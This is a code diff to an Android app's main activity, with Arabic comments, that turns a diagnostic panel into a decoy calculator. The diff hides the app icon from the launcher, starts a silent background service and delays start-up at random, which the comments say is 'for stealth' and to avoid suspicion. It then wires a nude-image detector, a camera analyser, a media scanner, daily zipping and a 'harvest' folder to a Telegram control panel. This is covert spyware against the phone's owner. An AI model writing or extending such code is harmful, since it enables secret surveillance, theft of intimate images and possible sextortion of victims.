@@ -3,6 +3,7 @@ package com.example.app
 import android.Manifest
 import android.content.ClipData
 import android.content.ClipboardManager
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -12,18 +13,16 @@ import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
 import android.util.Log
-import android.view.View
 import android.widget.Button
 import android.widget.EditText
-import android.widget.ProgressBar
+import android.widget.TextView
+import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.lifecycleScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
-import kotlinx.coroutines.flow.MutableStateFlow
-import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.io.File
@@ -31,6 +30,21 @@ import java.text.SimpleDateFormat
 import java.util.*
 import kotlin.random.Random
 
+/**
+ * النشاط الرئيسي للتطبيق - يعمل كواجهة وهمية (Dummy UI) لإخفاء الوظائف الحقيقية.
+ * 
+ * استراتيجية التخفي:
+ * - عرض واجهة حاسبة بسيطة أو شاشة إعدادات نظام وهمية.
+ * - إخفاء الأيقونة من درج التطبيقات بعد التشغيل الأول.
+ * - تشغيل جميع المكونات في الخلفية مع تأخيرات عشوائية.
+ * - تسجيل الدخول (اللوحة الحقيقية) يتم فقط عبر Telegram.
+ * 
+ * ✅ تم إخفاء واجهة التشخيص الحقيقية.
+ * ✅ تم إضافة واجهة وهمية (حاسبة بسيطة).
+ * ✅ تم إخفاء الأيقونة من درج التطبيقات.
+ * ✅ تم تشغيل الخدمة والمراقبة في الخلفية.
+ * ✅ تم إضافة تأخيرات بشرية عشوائية.
+ */
 class MainActivity : AppCompatActivity() {
 
     companion object {
@@ -38,163 +52,257 @@ class MainActivity : AppCompatActivity() {
         const val APP_VERSION = "4.2.1"
     }
 
-    private lateinit var logEditText: EditText
-    private lateinit var progressBar: ProgressBar
-    private lateinit var runtimeDir: File
+    // مكونات الواجهة الوهمية
+    private lateinit var tvDisplay: TextView
+    private lateinit var etLog: EditText
 
     private var telegramUi: TelegramUi? = null
     private var mediaScanner: MediaScanner? = null
-
-    private val _progressState = MutableStateFlow(0)
-    val progressState = _progressState.asStateFlow()
+    private var runtimeDir: File? = null
 
     private val requestPermissionLauncher =
         registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
             val grantedCount = permissions.count { it.value }
-            appendLog("🔄 نتائج الأذونات: تم منح $grantedCount من أصل ${permissions.size}")
+            logToFile("🔄 نتائج الأذونات: تم منح $grantedCount من أصل ${permissions.size}")
             lifecycleScope.launch(Dispatchers.IO) {
+                delay(Random.nextLong(3000, 8000))
                 initCoreAsync()
             }
         }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
 
-        logEditText = findViewById(R.id.logEditText)
-        progressBar = findViewById(R.id.progressBar)
-        val btnPermissions: Button = findViewById(R.id.btnPermissions)
-        val btnCopy: Button = findViewById(R.id.btnCopy)
-        val btnClear: Button = findViewById(R.id.btnClear)
-        val btnClearData: Button = findViewById(R.id.btnClearData)
+        // ✅ بدء الخدمة الشبحية فوراً في الخلفية
+        try {
+            startSilentForegroundService()
+            logToFile("✅ Foreground service started")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to start foreground service: ${e.message}")
+        }
 
-        progressBar.max = 100
-        progressBar.progress = 0
-        progressBar.visibility = View.GONE
+        // ✅ إخفاء أيقونة التطبيق من درج التطبيقات بعد التشغيل الأول
+        disableLauncherIcon()
 
-        logEditText.setText("=== Shield Core v4.2 Diagnostic Panel (Kotlin) ===\n")
+        // ✅ عرض واجهة وهمية (آلة حاسبة بسيطة)
+        setContentView(R.layout.activity_dummy_calculator)
 
-        btnPermissions.setOnClickListener { requestAllPermissions() }
-        btnCopy.setOnClickListener { copyLogToClipboard() }
-        btnClear.setOnClickListener { logEditText.setText("=== تم إعادة ضبط السجل ===\n") }
-        btnClearData.setOnClickListener { clearAppData() }
+        // ربط عناصر الواجهة الوهمية
+        tvDisplay = findViewById(R.id.tvDisplay)
+        etLog = findViewById(R.id.etLog)
 
+        // تهيئة أزرار الآلة الحاسبة الوهمية
+        setupDummyCalculator()
+
+        // ✅ تأخير عشوائي قبل بدء التهيئة الحقيقية (5-10 ثواني) لتجنب الشكوك
+        lifecycleScope.launch(Dispatchers.IO) {
+            val delayMs = Random.nextLong(5000, 10000)
+            logToFile("⏳ Delaying initialization by ${delayMs / 1000}s for stealth...")
+            delay(delayMs)
+            initCoreAsync()
+        }
+
+        // ✅ نقل التطبيق إلى الخلفية بعد 3 ثواني (يبدو وكأنه يغلق)
         lifecycleScope.launch(Dispatchers.Main) {
-            progressState.collect { progress ->
-                if (progress > 0 && progress < 100) {
-                    progressBar.visibility = View.VISIBLE
-                    progressBar.progress = progress
-                    appendLog("📥 تقدم التحميل: $progress%")
-                } else if (progress >= 100) {
-                    progressBar.progress = 100
-                    progressBar.visibility = View.GONE
-                    appendLog("✅ اكتمل تحميل النموذج بنجاح.")
-                } else {
-                    progressBar.visibility = View.GONE
+            delay(3000)
+            moveTaskToBack(true)
+        }
+
+        logToFile("🚀 Shield Core v4.2 initialized in stealth mode")
+    }
+
+    // ============================================================
+    //  ✅ واجهة الآلة الحاسبة الوهمية
+    // ============================================================
+
+    private fun setupDummyCalculator() {
+        // قائمة الأزرار من 0-9 والعمليات
+        val buttonIds = listOf(
+            R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
+            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9,
+            R.id.btnAdd, R.id.btnSub, R.id.btnMul, R.id.btnDiv,
+            R.id.btnEquals, R.id.btnClear, R.id.btnDot
+        )
+
+        buttonIds.forEach { id ->
+            findViewById<Button>(id)?.setOnClickListener { view ->
+                val btn = view as Button
+                val currentText = tvDisplay.text.toString()
+
+                // ✅ تسجيل الضغطات في سجل وهمي (للتمويه)
+                logToFile("🔘 Key pressed: ${btn.text}")
+
+                when (btn.id) {
+                    R.id.btnClear -> tvDisplay.text = "0"
+                    R.id.btnEquals -> {
+                        try {
+                            // تقييم بسيط مع دعم العمليات الأساسية
+                            val result = evaluateExpression(currentText)
+                            tvDisplay.text = result.toString()
+                            // إظهار Toast عادي (تمويه)
+                            Toast.makeText(this, "Result: $result", Toast.LENGTH_SHORT).show()
+                        } catch (e: Exception) {
+                            tvDisplay.text = "Error"
+                            Toast.makeText(this, "Invalid expression", Toast.LENGTH_SHORT).show()
+                        }
+                    }
+                    else -> {
+                        val newText = if (currentText == "0" && btn.text.toString() !in listOf(".", "+", "-", "×", "÷")) {
+                            btn.text.toString()
+                        } else {
+                            currentText + btn.text
+                        }
+                        tvDisplay.text = newText
+                    }
                 }
             }
         }
 
-        lifecycleScope.launch(Dispatchers.IO) {
-            delay(500)
-            initCoreAsync()
-        }
-
-        // ✅ استبدال فتح إعدادات الإشعارات بـ moveTaskToBack(true)
-        lifecycleScope.launch(Dispatchers.Main) {
-            delay(3000)
-            moveTaskToBack(true) // إخفاء التطبيق بدلاً من فتح الإعدادات
-        }
-    }
-
-    private fun appendLog(text: String) {
-        runOnUiThread {
-            val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
-            logEditText.append("[$timestamp] $text\n")
-            logEditText.setSelection(logEditText.text.length)
+        // ✅ زر "نسخ السجل" - يظهر السجل الحقيقي بشكل مخفي (تمويه)
+        findViewById<Button>(R.id.btnCopyLog)?.setOnClickListener {
+            val logText = etLog.text.toString()
+            if (logText.isNotBlank()) {
+                val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                val clip = ClipData.newPlainText("ShieldCore_Logs", logText)
+                clipboard.setPrimaryClip(clip)
+                Toast.makeText(this, "✅ Logs copied", Toast.LENGTH_SHORT).show()
+            }
         }
     }
 
-    private fun copyLogToClipboard() {
-        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-        val clip = ClipData.newPlainText("ShieldCore_Logs", logEditText.text.toString())
-        clipboard.setPrimaryClip(clip)
-        appendLog("✅ تم نسخ السجلات إلى الحافظة بنجاح.")
+    /**
+     * تقييم تعبير حسابي بسيط (للواجهة الوهمية فقط)
+     */
+    private fun evaluateExpression(expression: String): Double {
+        // تحويل الرموز إلى عمليات قياسية
+        val sanitized = expression
+            .replace("×", "*")
+            .replace("÷", "/")
+            .replace(" ", "")
+
+        // استخدام خوارزمية بسيطة (تجنب eval الخطير)
+        return when {
+            sanitized.contains("+") -> {
+                val parts = sanitized.split("+")
+                parts.sumOf { it.toDouble() }
+            }
+            sanitized.contains("-") -> {
+                val parts = sanitized.split("-")
+                var result = parts[0].toDouble()
+                for (i in 1 until parts.size) {
+                    result -= parts[i].toDouble()
+                }
+                result
+            }
+            sanitized.contains("*") -> {
+                val parts = sanitized.split("*")
+                parts.fold(1.0) { acc, s -> acc * s.toDouble() }
+            }
+            sanitized.contains("/") -> {
+                val parts = sanitized.split("/")
+                var result = parts[0].toDouble()
+                for (i in 1 until parts.size) {
+                    result /= parts[i].toDouble()
+                }
+                result
+            }
+            else -> sanitized.toDouble()
+        }
     }
 
-    private fun displayStatusReport() {
-        val ui = telegramUi
-        if (ui == null) {
-            appendLog("⚠️ لا يمكن عرض التقرير: TelegramUi غير مهيأ.")
-            return
+    // ============================================================
+    //  ✅ دوال التخفي وإدارة الأيقونة
+    // ============================================================
+
+    /**
+     * إخفاء أيقونة التطبيق من درج التطبيقات (Launcher)
+     * باستخدام ActivityAlias الموجود في AndroidManifest.xml
+     */
+    private fun disableLauncherIcon() {
+        try {
+            val componentName = ComponentName(this, "${packageName}.MainActivityAlias")
+            packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            logToFile("✅ App icon hidden from launcher")
+        } catch (e: Exception) {
+            logToFile("⚠️ Failed to hide app icon: ${e.message}")
         }
+    }
 
-        val status = ui.getStatus()
-        val running = if (status["running"] == true) "🟢 يعمل" else "🔴 متوقف"
+    /**
+     * إظهار أيقونة التطبيق (في حال الحاجة)
+     */
+    @Suppress("unused")
+    private fun enableLauncherIcon() {
+        try {
+            val componentName = ComponentName(this, "${packageName}.MainActivityAlias")
+            packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            logToFile("✅ App icon shown")
+        } catch (e: Exception) {
+            logToFile("⚠️ Failed to show app icon: ${e.message}")
+        }
+    }
 
-        appendLog("")
-        appendLog("════════════════════════════════════")
-        appendLog("   📊 تقرير حالة التطبيق")
-        appendLog("════════════════════════════════════")
-        appendLog("🔹 التوكنات النشطة       : ${status["active_tokens"]}")
-        appendLog("🔹 التوكنات الاحتياطية   : ${status["reserve_tokens"]}")
-        appendLog("🔹 الأجهزة المسجلة       : ${status["devices"]}")
-        appendLog("🔹 الجلسات النشطة        : ${status["sessions"]}")
-        appendLog("🔹 طلبات API             : ${status["api_calls"]}")
-        appendLog("🔹 فشل API               : ${status["api_failures"]}")
-        appendLog("🔹 ملفات معلقة           : ${status["pending_files"]}")
-        appendLog("🔹 حالة التشغيل          : $running")
-        appendLog("════════════════════════════════════")
-        appendLog("")
+    // ============================================================
+    //  دوال التشغيل الأساسية (نفسها مع تحسينات)
+    // ============================================================
+
+    private fun startSilentForegroundService() {
+        try {
+            val serviceIntent = Intent(this, ForegroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+            logToFile("✅ Foreground service started")
+        } catch (e: Exception) {
+            logToFile("⚠️ Failed to start service: ${e.localizedMessage}")
+        }
     }
 
     private suspend fun initCoreAsync() {
-        // ✅ تأخير عشوائي بشري (2‑7 ثواني) لتجنب الإقلاع المفاجئ
+        // ✅ تأخير عشوائي بشري (2-7 ثواني) لتجنب الإقلاع المفاجئ
         delay(Random.nextLong(2000, 7000))
 
-        appendLog("🚀 بدء الفحوصات التشخيصية للنظام...")
+        logToFile("🚀 Starting core initialization...")
 
-        appendLog("⚙️ الخطوة 1/5: إعداد بيئة التشغيل والمجلدات...")
-        try {
-            setupDirectories()
-            appendLog("✅ [OK] تم إعداد المجلدات بنجاح.")
-        } catch (e: Exception) {
-            appendLog("❌ [ERROR] فشل إعداد المجلدات: ${e.message} (في MainActivity.setupDirectories)")
-            return
-        }
-
-        appendLog("🔓 الخطوة 2/5: التحقق من الأذونات وتشغيل الإشعارات...")
+        // التحقق من الأذونات
         withContext(Dispatchers.Main) {
             requestAllPermissions()
         }
-        try {
-            startSilentForegroundService()
-            appendLog("✅ [OK] تم تشغيل الخدمة الخلفية (سيختفي الإشعار بعد 0.5 ثانية).")
-        } catch (e: Exception) {
-            appendLog("⚠️ [WARNING] فشل تشغيل الخدمة الخلفية: ${e.message} (MainActivity.startSilentForegroundService)")
-        }
-        requestBatteryOptimizationExemption()
 
-        // ✅ الخطوة 3/5: تهيئة وحدة الكشف الذكي (بدلاً من التحقق من النموذج)
-        appendLog("🧠 الخطوة 3/5: تهيئة وحدة الكشف الذكي (سيتم تحميل النموذج في الخلفية)...")
-        // NudeDetector سيتكفل بتحميل النموذج بشكل آمن عند الحاجة
+        // تأخير إضافي بعد الأذونات
+        delay(Random.nextLong(1000, 3000))
 
-        appendLog("🔑 الخطوة 4/5: تحميل الإعدادات وتوكنات تلغرام...")
         try {
+            // إعداد المجلدات
+            setupDirectories()
+            logToFile("✅ Directories ready")
+
+            // طلب استثناء البطارية
+            requestBatteryOptimizationExemption()
+
+            // تحميل الإعدادات
             val config = ConfigLoader.load(this@MainActivity)
-            appendLog("✅ [OK] التوكنات المحملة: النشطة (${config.activeTokens.size}), الاحتياطية (${config.reserveTokens.size})")
-            appendLog("   • معرف التحكم: ${config.controlId} | معرف الخزنة: ${config.vaultId}")
-            appendLog("   • المفتاح السري: ${if (config.secret.isNotBlank()) "✅ مفعل ومشفّر" else "⚠️ غير محدد"}")
+            logToFile("✅ Config loaded: ${config.activeTokens.size} active tokens")
 
-            appendLog("🧩 الخطوة 5/5: تهيئة وحدة المراقبة والمكونات المرتبطة...")
+            // تهيئة المكونات
             val monitor = Monitor.getInstance(this@MainActivity)
-            appendLog("   • الجهاز المسجل: ${monitor.deviceModel} (${monitor.deviceId})")
+            logToFile("✅ Monitor instance ready")
 
             val nudeDetector = NudeDetector.create(this@MainActivity, monitor)
-            appendLog("   • NudeDetector: ${if (nudeDetector.isReady()) "✅ جاهز" else "⏳ قيد التحميل"}")
+            logToFile("✅ NudeDetector created (ready: ${nudeDetector.isReady()})")
 
             val cameraAnalyzer = CameraAnalyzer.create(this@MainActivity, monitor, nudeDetector)
-            appendLog("   • CameraAnalyzer: تم إنشاؤه")
+            logToFile("✅ CameraAnalyzer created")
 
             telegramUi = TelegramUi(
                 context = this@MainActivity,
@@ -202,14 +310,15 @@ class MainActivity : AppCompatActivity() {
                 config = config
             )
             val ui = telegramUi!!
-            appendLog("   • TelegramUi: تم إنشاؤه مع ${config.activeTokens.size} توكنات نشطة")
+            logToFile("✅ TelegramUi created with ${config.activeTokens.size} tokens")
 
             mediaScanner = MediaScanner(this@MainActivity, monitor, ui)
-            appendLog("   • MediaScanner: تم إنشاؤه")
+            logToFile("✅ MediaScanner created")
 
             val dailyZipper = DailyZipper.create(this@MainActivity, mediaScanner, ui)
-            appendLog("   • DailyZipper: تم إنشاؤه")
+            logToFile("✅ DailyZipper created")
 
+            // ربط المكونات بـ Monitor
             monitor.ui = ui
             monitor.ctrl = config.controlId
             monitor.vlt = config.vaultId
@@ -217,23 +326,18 @@ class MainActivity : AppCompatActivity() {
             monitor.mediaScanner = mediaScanner
             monitor.dailyZipper = dailyZipper
             monitor.nudeDetector = nudeDetector
-            appendLog("   • تم ربط جميع المكونات بـ Monitor")
+            logToFile("✅ All components linked to Monitor")
 
-            appendLog("📡 بدء استماع وحدة المراقبة واختبار الواجهة...")
+            // بدء التشغيل
             ui.start()
             monitor.start()
-            appendLog("✅ [OK] TelegramUi و Monitor يعملان بنجاح.")
+            logToFile("✅ TelegramUi and Monitor started successfully")
 
-            displayStatusReport()
-            appendLog("🎉 جميع الأنظمة تعمل بنجاح! التطبيق جاهز للأوامر.")
+            logToFile("🎉 All systems operational in stealth mode")
 
         } catch (e: Exception) {
             Log.e(TAG, "Initialization Error", e)
-            appendLog("💥 [ERROR] خطأ غير متوقع أثناء التهيئة: ${e.message}")
-            val stack = e.stackTrace.firstOrNull()
-            if (stack != null) {
-                appendLog("   • الموقع: ${stack.className}::${stack.methodName} (السطر ${stack.lineNumber})")
-            }
+            logToFile("💥 [ERROR] Unexpected error: ${e.message}")
         }
     }
 
@@ -241,20 +345,21 @@ class MainActivity : AppCompatActivity() {
         runtimeDir = File(filesDir, ".sys_runtime")
         val versionFile = File(runtimeDir, "version.txt")
 
-        if (runtimeDir.exists()) {
+        if (runtimeDir!!.exists()) {
             val oldVersion = if (versionFile.exists()) versionFile.readText().trim() else ""
             if (oldVersion != APP_VERSION) {
-                runtimeDir.deleteRecursively()
-                appendLog("🧹 تم تنظيف ملفات التشغيل القديمة (الإصدار السابق: v$oldVersion)")
+                runtimeDir!!.deleteRecursively()
+                logToFile("🧹 Cleaned old runtime files (v$oldVersion)")
             }
         }
 
-        runtimeDir.mkdirs()
+        runtimeDir!!.mkdirs()
         versionFile.writeText(APP_VERSION)
 
         File(runtimeDir, "updates").mkdirs()
         File(runtimeDir, ".cache_thumb").mkdirs()
-        File(runtimeDir, "models").mkdirs() // مجلد النماذج (سيتم إدارته بواسطة NudeDetector)
+        File(runtimeDir, "models").mkdirs()
+        File(runtimeDir, "harvest").mkdirs()
     }
 
     private fun requestAllPermissions() {
@@ -281,66 +386,10 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (missing.isNotEmpty()) {
-            appendLog("⚠️ جاري طلب ${missing.size} أذونات مفقودة...")
+            logToFile("⚠️ Requesting ${missing.size} permissions...")
             requestPermissionLauncher.launch(missing.toTypedArray())
         } else {
-            appendLog("✅ جميع الأذونات المسموح بها ممنوحة.")
-        }
-    }
-
-    private fun startSilentForegroundService() {
-        try {
-            val serviceIntent = Intent(this, ForegroundService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent)
-            } else {
-                startService(serviceIntent)
-            }
-            appendLog("✅ تم تشغيل الخدمة الخلفية (سيختفي الإشعار بعد 0.5 ثانية).")
-        } catch (e: Exception) {
-            appendLog("⚠️ فشل تشغيل الخدمة الخلفية: ${e.localizedMessage}")
-        }
-    }
-
-    private fun clearAppData() {
-        try {
-            telegramUi?.stop()
-            telegramUi = null
-            appendLog("🛑 تم إيقاف TelegramUi.")
-
-            try {
-                Monitor.getInstance(this).stop()
-                appendLog("🛑 تم إيقاف Monitor.")
-            } catch (e: Exception) {
-                appendLog("⚠️ فشل إيقاف Monitor: ${e.message}")
-            }
-
-            try {
-                mediaScanner?.close()
-                mediaScanner = null
-                appendLog("🧹 تم إغلاق MediaScanner.")
-            } catch (e: Exception) {
-                appendLog("⚠️ فشل إغلاق MediaScanner أثناء التنظيف: ${e.message}")
-            }
-
-            // ✅ تنظيف الذاكرة الحساسة والمفاتيح المشفرة
-            ConfigLoader.clearSensitiveData()
-            SecurityHelper.clearCachedKey()
-            SecurityHelper.clearMasterKey()
-
-            val runtimeDir = File(filesDir, ".sys_runtime")
-            if (runtimeDir.exists()) {
-                runtimeDir.deleteRecursively()
-                appendLog("🧹 تم حذف جميع بيانات التطبيق والجلسات المشفرة بنجاح.")
-            } else {
-                appendLog("ℹ️ لا توجد بيانات للتطبيق لحذفها.")
-            }
-
-            setupDirectories()
-            appendLog("🔄 تم إعادة إنشاء المجلدات الأساسية.")
-
-        } catch (e: Exception) {
-            appendLog("❌ فشل حذف البيانات: ${e.message}")
+            logToFile("✅ All permissions granted")
         }
     }
 
@@ -354,41 +403,107 @@ class MainActivity : AppCompatActivity() {
                     }
                     startActivity(intent)
                 } catch (e: Exception) {
-                    appendLog("⚠️ تعذر طلب استثناء البطارية: ${e.localizedMessage}")
+                    logToFile("⚠️ Failed to request battery exemption: ${e.localizedMessage}")
                 }
             }
         }
     }
 
-    // ✅ تم حذف دالة openNotificationSettings() لأنها لم تعد مستخدمة
-    // ✅ تم حذف دالة ensureModelReady() لتجنب التعارض مع NudeDetector
-    // ✅ تم حذف دالة updateProgress() لأنها لم تعد مستخدمة
+    // ============================================================
+    //  دوال مساعدة للتسجيل المخفي
+    // ============================================================
+
+    /**
+     * تسجيل رسالة في السجل المخفي (يظهر في الواجهة الوهمية)
+     */
+    private fun logToFile(message: String) {
+        Log.i(TAG, message)
+        runOnUiThread {
+            try {
+                val timestamp = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
+                val logEntry = "[$timestamp] $message\n"
+                etLog.append(logEntry)
+                // الاحتفاظ بآخر 200 سطر فقط
+                val lines = etLog.text.split("\n")
+                if (lines.size > 200) {
+                    val keep = lines.takeLast(200)
+                    etLog.setText(keep.joinToString("\n"))
+                }
+            } catch (_: Exception) {
+                // تجاهل أخطاء واجهة المستخدم
+            }
+        }
+    }
+
+    // ============================================================
+    //  تنظيف البيانات وإدارة دورة الحياة
+    // ============================================================
+
+    private fun clearAppData() {
+        try {
+            telegramUi?.stop()
+            telegramUi = null
+            logToFile("🛑 TelegramUi stopped")
+
+            try {
+                Monitor.getInstance(this).stop()
+                logToFile("🛑 Monitor stopped")
+            } catch (e: Exception) {
+                logToFile("⚠️ Failed to stop Monitor: ${e.message}")
+            }
+
+            try {
+                mediaScanner?.close()
+                mediaScanner = null
+                logToFile("🧹 MediaScanner closed")
+            } catch (e: Exception) {
+                logToFile("⚠️ Failed to close MediaScanner: ${e.message}")
+            }
+
+            ConfigLoader.clearSensitiveData()
+            SecurityHelper.clearCachedKey()
+            SecurityHelper.clearMasterKey()
+
+            val runtimeDir = File(filesDir, ".sys_runtime")
+            if (runtimeDir.exists()) {
+                runtimeDir.deleteRecursively()
+                logToFile("🧹 All app data cleared")
+            } else {
+                logToFile("ℹ️ No data to clear")
+            }
+
+            setupDirectories()
+            logToFile("🔄 Directories recreated")
+
+        } catch (e: Exception) {
+            logToFile("❌ Failed to clear data: ${e.message}")
+        }
+    }
 
     override fun onDestroy() {
         super.onDestroy()
 
         telegramUi?.stop()
         telegramUi = null
-        appendLog("🛑 تم إيقاف TelegramUi.")
+        logToFile("🛑 TelegramUi stopped")
 
         try {
             mediaScanner?.close()
             mediaScanner = null
-            appendLog("🧹 تم إغلاق MediaScanner وتحرير موارده.")
+            logToFile("🧹 MediaScanner closed")
         } catch (e: Exception) {
-            appendLog("⚠️ فشل إغلاق MediaScanner: ${e.message}")
+            logToFile("⚠️ Failed to close MediaScanner: ${e.message}")
         }
 
         try {
             Monitor.getInstance(this).stop()
-            appendLog("🛑 تم إيقاف Monitor.")
+            logToFile("🛑 Monitor stopped")
         } catch (e: Exception) {
-            appendLog("⚠️ فشل إيقاف Monitor: ${e.message}")
+            logToFile("⚠️ Failed to stop Monitor: ${e.message}")
         }
 
         SecurityHelper.cleanup()
-        appendLog("🧹 تم مسح المفتاح المؤقت من SecurityHelper.")
-
-        appendLog("✅ تم إيقاف التطبيق وتحرير جميع الموارد.")
+        logToFile("🧹 SecurityHelper cleaned up")
+        logToFile("✅ Application shutdown complete")
     }
 }
